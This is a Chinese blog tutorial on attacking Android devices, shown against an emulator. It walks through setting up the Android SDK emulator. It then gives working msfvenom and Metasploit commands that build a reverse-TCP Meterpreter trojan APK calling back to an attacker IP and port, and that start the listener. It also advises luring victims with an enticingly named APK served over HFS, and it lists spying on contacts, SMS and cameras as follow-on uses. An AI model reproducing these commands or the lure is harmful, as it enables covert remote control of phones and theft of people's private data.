上期预告说做一期针对安卓移动终端的攻击实践，本博主从不跳票，这就开始。

1、安装安卓模拟器

安卓模拟器有多种系统的软件版本，我个人觉得windows的比较方便，

到https://developer.android.com/sdk/上下载installer\_r24.2-windows.exe，

其运行环境需要jdk，因此再访问http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html下载jdk-8u45-windows-x64.exe，

两个都安装完成后，启动Android SDK Manager，安装需要的组件，除了基础组件，我这里选择了安卓4.3版本的系统组件来进行实践，

![](../Images/83f6be3d4f97b8ede90bafa86dac39cf.png)  

启动AVD Manager，创建安卓虚拟机模板，

![](../Images/87d68b880887e82a7c61cd34a30ef011.png)  

启动安卓虚拟机，

![](../Images/aed0c43e2b6c8d5cbe5949d1e6ac2e0d.png)  

启动成功，

![](../Images/eb44d232ccbfce97b882fbd84b92eef6.png)  

 

2、制作后门程序进行攻击

在Metasploit下制作木马文件， 

msfvenom -p android/meterpreter/reverse\_tcp LHOST=192.168.1.4 LPORT=8080 -f raw > test.apk

在Metasploit下开启一个监听，

use exploit/multi/handler

set payload android/meterpreter/reverse\_tcp

set LHOST 192.168.1.4

set LPORT 8080

exploit

用hfs搭建一个http文件下载服务，让安卓虚拟机下载后门文件，这个过程其实就是社会工程了，你可以把apk文件命名的很吸引人，比如”1024 unblock”，你懂的。

![](../Images/d6bd4146e137991ead7b51a874586ee4.png)  

下载完成后会提示安装，安装完成后会提示打开，打开后就没有然后了……

此时Metasploit监听已经收到了命令行，sysinfo一下，确实是这个安卓4.3，

![](../Images/22517a46a8f27107c2c560936322eec1.png)  

进一步的攻击我就不讲了，太邪恶，能导出电话簿、导出短信、用前后置摄像头偷拍等等。
